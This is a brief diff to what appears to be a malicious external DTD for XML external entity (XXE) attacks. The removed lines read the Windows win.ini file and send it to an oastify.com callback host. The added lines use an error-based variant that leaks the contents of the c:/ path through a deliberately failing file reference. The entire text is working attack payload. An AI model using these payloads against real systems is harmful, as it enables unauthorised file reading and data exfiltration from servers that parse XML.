@@ -1,3 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://k6r64857jhglkp1e5dmefltz4qaky9.oastify.com/?%file;'>">
-%all;
+<!ENTITY % file SYSTEM "file:///c:/">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
